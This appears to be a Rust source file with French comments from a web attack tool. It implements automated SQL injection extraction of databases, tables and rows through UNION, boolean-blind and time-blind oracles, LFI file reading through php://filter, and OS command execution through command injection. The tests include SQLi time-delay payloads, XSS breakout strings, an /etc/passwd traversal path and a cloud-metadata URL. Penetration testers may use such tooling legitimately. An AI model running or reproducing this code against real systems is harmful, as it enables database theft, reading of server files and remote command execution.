/// Valeurs d'une colonne d'une table.
fn row_query(dbms: Option<&str>, table: &str, column: &str, i: usize) -> Option<String> {
    let t = sql_escape_ident(table);
    let c = sql_escape_ident(column);
    match dbms {
        Some("postgres") => Some(format!("SELECT {} FROM {} LIMIT 1 OFFSET {}", c, t, i)),
        Some("mssql") => Some(format!(
            "SELECT {} FROM {} ORDER BY (SELECT NULL) OFFSET {} ROWS FETCH NEXT 1 ROWS ONLY",
            c, t, i
        )),
        Some("oracle") | Some("sqlite") => None,
        _ => Some(format!("SELECT {} FROM {} LIMIT {},1", c, t, i)),
    }
}

/// Expression donnant le nom de la base courante (selon le SGBD).
fn current_db_expr(dbms: Option<&str>) -> Option<&'static str> {
    match dbms {
        Some("postgres") => Some("current_database()"),
        Some("mssql") => Some("DB_NAME()"),
        Some("oracle") | Some("sqlite") => None,
        _ => Some("database()"),
    }
}

/// Résultat d'une extraction de données via une injection SQL aveugle.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct SqliExtraction {
    /// Paramètre vulnérable.
    pub param: String,
    /// Vecteur d'injection retenu : `"GET"` ou `"POST"`.
    pub injection: String,
    /// Vecteur d'extraction retenu : `"UNION"`, `"boolean-blind"` ou `"time-blind"`.
    pub technique: String,
    /// SGBD deviné d'après la signature d'erreur.
    pub dbms: Option<String>,
    /// Base de données courante.
    pub current_db: Option<String>,
    /// Bases/schémas découverts.
    pub databases: Vec<String>,
    /// Tables découvertes.
    pub tables: Vec<String>,
    /// Colonnes de la première table.
    pub columns: Vec<String>,
    /// Valeurs de la première colonne (masquées si sensibles).
    pub rows: Vec<String>,
    /// Remarques d'exécution (oracle inexploitable, etc.).
    pub notes: Vec<String>,
}

/// Envoie un payload selon le vecteur choisi et rend la longueur du corps.
async fn send_payload_len(
    client: &Client,
    base_url: &str,
    param: &str,
    payload: &str,
    injection: &str,
    attempts: usize,
) -> Option<usize> {
    if injection == "POST" {
        http_post_form(client, base_url, &[(param, payload)], attempts)
            .await
            .map(|(_, b, _)| b.len())
    } else {
        let url = format!("{}?{}={}", base_url, param, urlencoding::encode(payload));
        http_get(client, &url, attempts)
            .await
            .map(|(_, b, _)| b.len())
    }
}

/// Extrait des données via une injection SQL, en sélectionnant automatiquement
/// le meilleur vecteur disponible.
///
/// Pipeline : détection de contexte → choix de l'oracle (`UNION` direct, puis
/// boolean blind, puis time-based) → reconstruction des métadonnées puis des
/// lignes. Retourne `None` si aucun contexte d'injection n'est détecté.
pub async fn extract_sqli_data(
    base_url: &str,
    param: &str,
    cfg: &WebAttackConfig,
) -> Option<SqliExtraction> {
    let client = build_client(cfg);
    let ctx = detect_sqli_context(&client, base_url, param, cfg).await?;

    let mut extraction = SqliExtraction {
        param: param.to_string(),
        dbms: ctx.dbms.map(|s| s.to_string()),
        ..Default::default()
    };

    let dialect = SqliDialect::for_dbms(ctx.dbms);

    // Vecteur d'injection : GET, repli POST si le GET échoue.
    let mut injection = "GET".to_string();
    let probe = sqli_condition_payload("1", &ctx, "1=1");
    if send_payload_len(&client, base_url, param, &probe, &injection, 1)
        .await
        .is_none()
    {
        injection = "POST".to_string();
        if send_payload_len(&client, base_url, param, &probe, &injection, 1)
            .await
            .is_none()
        {
            extraction
                .notes
                .push("vecteur d'injection injoignable".into());
            return Some(extraction);
        }
    }
    extraction.injection = injection.clone();

    // Sélection de l'oracle : UNION → boolean blind → time-based. Sans oracle
    // concluant, aucune extraction n'est possible : on le journalise et on sort.
    let Some(reader) =
        select_reader(&client, base_url, param, &injection, &ctx, &dialect, cfg).await
    else {
        extraction
            .notes
            .push("aucun oracle exploitable (UNION/boolean/time)".into());
        return Some(extraction);
    };
    extraction.technique = reader.label().to_string();

    let max_len = cfg.extract_max_len;

    let ident: Vec<char> = IDENT_CHARSET.iter().map(|&b| b as char).collect();
    let data = data_charset();

    // Base de données courante.
    if let Some(expr) = current_db_expr(ctx.dbms) {
        if let Some(v) = reader.read(&format!("({})", expr), &ident, max_len).await {
            if !v.is_empty() {
                extraction.current_db = Some(v);
            }
        }
    }

    // Bases/schémas.
    for i in 0..cfg.extract_max_items {
        let Some(q) = databases_query(ctx.dbms, i) else {
            break;
        };
        match reader.read(&format!("({})", q), &ident, max_len).await {
            Some(v) if !v.is_empty() => extraction.databases.push(v),
            _ => break,
        }
    }

    // Tables.
    for i in 0..cfg.extract_max_items {
        let Some(q) = tables_query(ctx.dbms, i) else {
            break;
        };
        match reader.read(&format!("({})", q), &ident, max_len).await {
            Some(v) if !v.is_empty() => extraction.tables.push(v),
            _ => break,
        }
    }

    // Colonnes de la première table.
    if let Some(table) = extraction.tables.first().cloned() {
        for i in 0..cfg.extract_max_items {
            let Some(q) = columns_query(ctx.dbms, &table, i) else {
                break;
            };
            match reader.read(&format!("({})", q), &ident, max_len).await {
                Some(v) if !v.is_empty() => extraction.columns.push(v),
                _ => break,
            }
        }
    }

    // Lignes : première table + première colonne.
    if let (Some(table), Some(col)) = (
        extraction.tables.first().cloned(),
        extraction.columns.first().cloned(),
    ) {
        let sensitive = is_sensitive_column(&col);
        for i in 0..cfg.extract_max_items {
            let Some(q) = row_query(ctx.dbms, &table, &col, i) else {
                break;
            };
            match reader.read(&format!("({})", q), &data, max_len).await {
                Some(v) if !v.is_empty() => {
                    extraction
                        .rows
                        .push(if sensitive { mask_extracted(&v) } else { v })
                }
                _ => break,
            }
        }
    }

    println!(
        "  \x1b[35m[SQLi EXTRACT]\x1b[0m {} param={} vecteur={} db={:?} tables={} rows={}",
        base_url,
        param,
        extraction.technique,
        extraction.current_db,
        extraction.tables.len(),
        extraction.rows.len()
    );

    Some(extraction)
}

/// Lit un fichier via une LFI (wrapper base64, puis chemin brut).
pub async fn read_lfi_file(
    base_url: &str,
    param: &str,
    file: &str,
    cfg: &WebAttackConfig,
) -> Option<String> {
    let client = build_client(cfg);
    let b64 = base64::engine::general_purpose::STANDARD;

    // 1. php://filter — le contenu revient encodé en base64.
    let wrapper = format!("php://filter/convert.base64-encode/resource={}", file);
    let url = format!("{}?{}={}", base_url, param, urlencoding::encode(&wrapper));
    if let Some((_, body, _)) = http_get(&client, &url, cfg.retries).await {
        let trimmed = body.trim();
        if trimmed.len() > 20
            && trimmed
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || "+/=".contains(c))
        {
            if let Ok(bytes) = b64.decode(trimmed) {
                if let Ok(text) = String::from_utf8(bytes) {
                    return Some(truncate_chars(&text, 5000));
                }
            }
        }
    }

    // 2. Chemin brut.
    let url = format!("{}?{}={}", base_url, param, urlencoding::encode(file));
    if let Some((_, body, _)) = http_get(&client, &url, cfg.retries).await {
        if !body.trim().is_empty() {
            return Some(truncate_chars(&body, 5000));
        }
    }
    None
}

/// Exécute une commande OS via une injection de commande (lecture de sortie).
pub async fn exec_cmdi_command(
    base_url: &str,
    param: &str,
    cmd: &str,
    cfg: &WebAttackConfig,
) -> Option<String> {
    let client = build_client(cfg);
    let marker = format!("NRTG{}", rand::random::<u32>());
    let payload = format!("; echo {m}; {c}; echo {m}", m = marker, c = cmd);

    // GET puis repli POST.
    let url = format!("{}?{}={}", base_url, param, urlencoding::encode(&payload));
    let mut body = http_get(&client, &url, cfg.retries)
        .await
        .map(|(_, b, _)| b);
    if body.is_none() {
        body = http_post_form(&client, base_url, &[(param, payload.as_str())], cfg.retries)
            .await
            .map(|(_, b, _)| b);
    }
    let body = body?;

    // Sortie = texte entre la 1re et la dernière occurrence du marqueur.
    let first = body.find(&marker)?;
    let last = body.rfind(&marker)?;
    if last <= first + marker.len() {
        return None;
    }
    let out = body[first + marker.len()..last].trim();
    if out.is_empty() {
        return None;
    }
    Some(truncate_chars(out, 5000))
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests — helpers purs (contexte d'injection, chaînage SSRF)
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sqli_dbms_classification() {
        assert_eq!(
            classify_sqli_dbms("you have an error in your sql syntax"),
            Some("mysql")
        );
        assert_eq!(
            classify_sqli_dbms("syntax error at or near \"from\""),
            Some("postgres")
        );
        assert_eq!(
            classify_sqli_dbms("unclosed quotation mark after the character string"),
            Some("mssql")
        );
        assert_eq!(
            classify_sqli_dbms("ora-01756: quoted string not properly terminated"),
            Some("oracle")
        );
        assert_eq!(
            classify_sqli_dbms("sqlite3.operationalerror"),
            Some("sqlite")
        );
        assert_eq!(classify_sqli_dbms("page not found"), None);
    }

    #[test]
    fn comments_follow_dbms() {
        assert_eq!(comments_for_dbms(Some("mysql")), &["-- ", "#", "/*"]);
        assert_eq!(comments_for_dbms(Some("mssql")), &["-- "]);
        assert_eq!(comments_for_dbms(None), &["-- "]);
    }

    #[test]
    fn sqli_payloads_follow_detected_context() {
        let ctx = SqliContext {
            quote: "'",
            paren: true,
            comment: "-- ",
            dbms: Some("mysql"),
        };
        let payloads = sqli_context_payloads(&ctx);
        // Guillemet ET parenthèse du contexte sont repris tels quels.
        assert!(payloads.iter().any(|(p, _)| p == "') AND 1=1-- "));
        assert!(payloads
            .iter()
            .any(|(p, _)| p == "') UNION SELECT NULL,NULL,NULL-- "));
        // MySQL accepte `#` : utile contre les filtres qui ne bloquent que `--`.
        assert!(payloads.iter().any(|(p, _)| p == "') AND 1=2#"));
        // Primitive de délai propre au SGBD (jamais pg_sleep sur MySQL).
        assert!(payloads.iter().any(|(p, _)| p.contains("SLEEP(3)")));
        assert!(!payloads.iter().any(|(p, _)| p.contains("pg_sleep")));
    }

    #[test]
    fn time_based_payload_detection_is_case_insensitive() {
        assert!(is_time_based_payload("1' AND SLEEP(3)-- "));
        assert!(is_time_based_payload("1' AND pg_sleep(3)-- "));
        assert!(is_time_based_payload("1; WAITFOR DELAY '0:0:3'-- "));
        assert!(is_time_based_payload(
            "' AND dbms_pipe.receive_message(('a'),3) IS NULL-- "
        ));
        assert!(!is_time_based_payload("1' AND 1=1-- "));
    }

    #[test]
    fn xss_context_is_classified() {
        assert_eq!(
            classify_xss_context("<html><p>nrtg42</p></html>", "nrtg42"),
            XssContext::HtmlText
        );
        assert_eq!(
            classify_xss_context("<div class=\"nrtg42\">", "nrtg42"),
            XssContext::Attribute
        );
        assert_eq!(
            classify_xss_context("<script>var x='nrtg42';</script>", "nrtg42"),
            XssContext::ScriptBlock
        );
        // Script refermé avant le marqueur ⇒ retour au contexte texte.
        assert_eq!(
            classify_xss_context("<script>x=1;</script><p>nrtg42</p>", "nrtg42"),
            XssContext::HtmlText
        );
        assert_eq!(
            classify_xss_context("<p>autre</p>", "nrtg42"),
            XssContext::NotFound
        );
    }

    #[test]
    fn xss_payloads_break_out_of_attribute() {
        let payloads = xss_context_payloads(XssContext::Attribute, "nrtg42");
        assert!(payloads.iter().any(|p| p.contains("onmouseover=")));
        assert!(payloads.iter().all(|p| p.contains("nrtg42")));
        assert!(xss_context_payloads(XssContext::NotFound, "nrtg42").is_empty());
    }

    #[test]
    fn aws_role_name_filter_rejects_html_and_spaces() {
        assert!(is_aws_role_name("MyInstanceRole"));
        assert!(is_aws_role_name("role_with.symbols+=,@-"));
        assert!(!is_aws_role_name("<html>not found</html>"));
        assert!(!is_aws_role_name("two words"));
        assert!(!is_aws_role_name(""));
    }

    #[test]
    fn cloud_secret_scan_finds_aws_key_and_assignments() {
        let text = concat!(
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n",
            "secret=\"abcdef123456\"\n",
        );
        let found = scan_text_for_cloud_secrets(text, "http://169.254.169.254/latest/user-data");
        assert!(found
            .iter()
            .any(|s| s.kind == "aws_access_key_id" && s.value == "AKIAIOSFODNN7EXAMPLE"));
        assert!(found
            .iter()
            .any(|s| s.kind == "secret" && s.value == "abcdef123456"));
        assert!(found.iter().all(|s| s.source.contains("#L")));
    }

    #[test]
    fn cloud_secret_scan_ignores_short_values_and_non_ascii() {
        // Valeur trop courte (< 6) : ignorée.
        assert!(scan_text_for_cloud_secrets("token=abc\n", "src").is_empty());
        // Ligne non ASCII : le découpage par octets serait invalide, on saute.
        assert!(scan_text_for_cloud_secrets("secret=café123\n", "src").is_empty());
    }

    // ── Extraction de données post-exploitation ─────────────────────────────

    #[tokio::test]
    async fn blind_extract_rebuilds_string() {
        // Oracle factice : longueur connue + comparaison de caractère.
        let target = "admin";
        let charset: Vec<char> = "abcdefghijklmnopqrstuvwxyz".chars().collect();

        let out = blind_extract(
            &charset,
            target.len(),
            || Box::pin(async move { Some(target.len()) }),
            |i, c| Box::pin(async move { Some(target.chars().nth(i) == Some(c)) }),
        )
        .await;

        assert_eq!(out.as_deref(), Some("admin"));
    }

    #[tokio::test]
    async fn blind_extract_stops_on_indeterminate_oracle() {
        let charset: Vec<char> = "abc".chars().collect();

        // Position 0 : oracle OK ('a'). Position 1 : oracle `None` ⇒ arrêt.
        let out = blind_extract(
            &charset,
            3,
            || Box::pin(async move { Some(3usize) }),
            |i, c| {
                Box::pin(async move {
                    if i == 0 {
                        Some(c == 'a')
                    } else {
                        None
                    }
                })
            },
        )
        .await;

        assert_eq!(out.as_deref(), Some("a"));
    }

    #[tokio::test]
    async fn blind_extract_zero_len_is_empty() {
        let charset: Vec<char> = "abc".chars().collect();
        let out = blind_extract(
            &charset,
            5,
            || Box::pin(async move { Some(0usize) }),
            |_, _| Box::pin(async move { Some(false) }),
        )
        .await;
        assert_eq!(out.as_deref(), Some(""));
    }

    #[test]
    fn sqli_condition_payload_shapes() {
        let flat = SqliContext {
            quote: "'",
            paren: false,
            comment: "-- ",
            dbms: Some("mysql"),
        };
        assert_eq!(sqli_condition_payload("1", &flat, "1=1"), "1' AND 1=1-- ");

        let paren = SqliContext {
            quote: "'",
            paren: true,
            comment: "-- ",
            dbms: Some("mysql"),
        };
        assert_eq!(sqli_condition_payload("1", &paren, "1=2"), "1') AND 1=2-- ");
    }

    #[test]
    fn dialect_expressions_per_dbms() {
        let my = SqliDialect::for_dbms(Some("mysql"));
        assert_eq!(my.length_fn, "LENGTH");
        assert_eq!(my.substr_fn, "SUBSTRING");
        assert_eq!(my.sleep_fn, Some("SLEEP"));
        assert_eq!(my.len_expr("database()"), "LENGTH(database())");
        assert_eq!(my.substr_expr("database()", 1), "SUBSTRING(database(),1,1)");

        let pg = SqliDialect::for_dbms(Some("postgres"));
        assert_eq!(pg.length_fn, "LENGTH");
        assert_eq!(pg.substr_fn, "SUBSTRING");
        assert_eq!(pg.sleep_fn, Some("PG_SLEEP"));
        assert_eq!(
            pg.substr_expr("current_database()", 2),
            "SUBSTRING(current_database(),2,1)"
        );

        // Défaut / None = MySQL ; Oracle/SQLite sans primitive de délai.
        assert_eq!(SqliDialect::for_dbms(None).sleep_fn, Some("SLEEP"));
        assert_eq!(SqliDialect::for_dbms(Some("oracle")).sleep_fn, None);
    }

    #[test]
    fn sensitive_columns_and_masking() {
        assert!(is_sensitive_column("password"));
        assert!(is_sensitive_column("API_KEY"));
        assert!(is_sensitive_column("user_hash"));
        assert!(!is_sensitive_column("username"));

        assert_eq!(mask_extracted("AKIAIOSFODNN7EXAMPLE"), "AKIA***");
        assert_eq!(mask_extracted("abcd"), "***");
        assert_eq!(mask_extracted("abc"), "***");
    }

    #[test]
    fn metadata_queries_use_limit_and_offset() {
        // MySQL (et défaut) : `LIMIT i,1`.
        let db_my = databases_query(Some("mysql"), 2).unwrap();
        assert!(db_my.contains("information_schema.schemata"));
        assert!(db_my.contains("LIMIT 2,1"));

        // Postgres : `LIMIT 1 OFFSET i`.
        let db_pg = databases_query(Some("postgres"), 2).unwrap();
        assert!(db_pg.contains("LIMIT 1 OFFSET 2"));

        let t_my = tables_query(None, 0).unwrap();
        assert!(t_my.contains("LIMIT 0,1"));
        let t_pg = tables_query(Some("postgres"), 1).unwrap();
        assert!(t_pg.contains("LIMIT 1 OFFSET 1"));

        let c_my = columns_query(Some("mysql"), "users", 3).unwrap();
        assert!(c_my.contains("table_name='users'"));
        assert!(c_my.contains("LIMIT 3,1"));
        let c_pg = columns_query(Some("postgres"), "users", 3).unwrap();
        assert!(c_pg.contains("LIMIT 1 OFFSET 3"));

        let r_my = row_query(Some("mysql"), "users", "name", 1).unwrap();
        assert!(r_my.contains("SELECT name FROM users"));
        assert!(r_my.contains("LIMIT 1,1"));
        let r_pg = row_query(Some("postgres"), "users", "name", 1).unwrap();
        assert!(r_pg.contains("LIMIT 1 OFFSET 1"));

        // SGBD non supportés : aucune requête.
        assert!(databases_query(Some("oracle"), 0).is_none());
        assert!(tables_query(Some("sqlite"), 0).is_none());
    }

    #[test]
    fn sql_escape_doubles_single_quotes() {
        assert_eq!(sql_escape_ident("user's"), "user''s");
        assert_eq!(escape_char('\''), "''");
        assert_eq!(escape_char('a'), "a");
    }

    #[test]
    fn payload_kind_from_cli_aliases() {
        assert_eq!(PayloadKind::from_cli("SQLI"), Some(PayloadKind::Sqli));
        assert_eq!(PayloadKind::from_cli("lfi"), Some(PayloadKind::Traversal));
        assert_eq!(PayloadKind::from_cli("rce"), Some(PayloadKind::Cmdi));
        assert_eq!(PayloadKind::from_cli("params"), Some(PayloadKind::Params));
        assert_eq!(PayloadKind::from_cli("nope"), None);
        // Colonnes attendues par famille.
        assert_eq!(PayloadKind::Ssti.columns(), 3);
        assert_eq!(PayloadKind::Xss.columns(), 1);
        assert_eq!(PayloadKind::Sqli.columns(), 2);
    }

    #[test]
    fn load_payload_file_parses_columns_and_filters() {
        let dir = tempfile::tempdir().unwrap();

        // Commentaires, lignes vides, `trim`, dédoublonnage, séparateur TAB.
        let f = dir.path().join("sqli.txt");
        std::fs::write(
            &f,
            "# commentaire\n'a\tmysql|postgres\n\n  'b  \t mssql \n'a\tmysql|postgres\n",
        )
        .unwrap();
        let rows = load_payload_file(f.to_str().unwrap(), 2).unwrap();
        assert_eq!(rows.len(), 2);
        assert_eq!(
            rows[0],
            vec!["'a".to_string(), "mysql|postgres".to_string()]
        );
        assert_eq!(rows[1], vec!["'b".to_string(), "mssql".to_string()]);

        // Colonne manquante complétée par une chaîne vide (marqueur optionnel).
        let lfi = dir.path().join("lfi.txt");
        std::fs::write(&lfi, "../../etc/passwd\r\n").unwrap();
        let rows = load_payload_file(lfi.to_str().unwrap(), 2).unwrap();
        assert_eq!(rows[0], vec!["../../etc/passwd".to_string(), String::new()]);

        // Chemin illisible → erreur explicite.
        assert!(load_payload_file("/nonexistent/nope.txt", 2).is_err());
    }

    #[test]
    fn external_payloads_merge_then_replace() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("xss.txt");
        std::fs::write(&f, "<svg onload=alert(1)>\n").unwrap();

        // Additif : le payload externe s'ajoute aux payloads embarqués.
        let mut ext = ExternalPayloads::default();
        let (n, total) = ext
            .load_from_file(PayloadKind::Xss, f.to_str().unwrap(), false)
            .unwrap();
        assert_eq!((n, total), (1, 1));
        let builtin = xss_payloads(&ext);
        assert!(builtin.iter().any(|p| p == "<svg onload=alert(1)>"));
        assert!(
            builtin.len() > 1,
            "les payloads embarqués doivent être préservés"
        );

        // Remplacement : seul le contenu du fichier subsiste dans la famille.
        let (n, total) = ext
            .load_from_file(PayloadKind::Xss, f.to_str().unwrap(), true)
            .unwrap();
        assert_eq!((n, total), (1, 1));
        assert_eq!(ext.xss, vec!["<svg onload=alert(1)>".to_string()]);
    }
}
